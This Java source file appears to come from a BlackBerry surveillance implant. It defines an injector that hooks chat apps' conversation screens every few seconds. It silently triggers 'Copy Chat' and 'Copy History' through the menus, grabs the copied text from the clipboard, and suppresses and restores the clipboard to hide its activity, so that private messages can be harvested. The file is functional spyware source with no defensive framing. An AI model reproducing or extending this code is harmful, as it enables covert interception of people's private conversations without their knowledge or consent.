package blackberry.injection.injectors;

import java.util.Vector;

import net.rim.device.api.system.Clipboard;
import net.rim.device.api.ui.Screen;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.MenuWalker;
import blackberry.injection.injectors.conversation.ConversationScreen;

public abstract class AConversationInjector extends AInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("AConversationInjector",
            DebugLevel.VERBOSE);
    //#endif

    ConversationScreen conversationScreen;
    
    public abstract String getAppName();
    public abstract String getCodName();

    public String[] getWantedScreen() {
        return new String[] { "ConversationScreen" };
    }

    /**
     * viene eseguito sul ConversationScreen, ogni 5 secondi
     */
    public final void playOnScreen(Screen screen) {
        //#ifdef DEBUG
        debug.trace("playOnScreen");
        //#endif

        String conversation = extractConversation(screen);
        conversationScreen.getConversationScreen(conversation, this);
        
    }
    
    private String extractConversation(Screen screen) {
        //#ifdef DEBUG
        debug.trace("extractConversation"); //$NON-NLS-1$
        //#endif

        String clip = null;

        disableClipboard();
        //1g.1=Copy Chat
        //1g.2=Copy History
        if (MenuWalker.walk(
                new String[] { "Copy Chat",
                        "Copy History" }, //$NON-NLS-1$ //$NON-NLS-2$
                screen, true)) {

            clip = (String) Clipboard.getClipboard().get();
            //#ifdef DEBUG
            debug.trace("extractConversation: " + clip.length());
            //#endif
            setClipboard(clip);

        } else {
            //#ifdef DEBUG
            debug.info("NO Conversation screen!"); //$NON-NLS-1$
            //#endif
        }
        enableClipboard();
        return clip;
    }


    public void addLines(String partecipants, Vector lines) {
        //ModuleChat agent = (ModuleChat) ModuleChat.getInstance();
        //agent.add(getAppName(),partecipants, lines);
        
        
    }



}
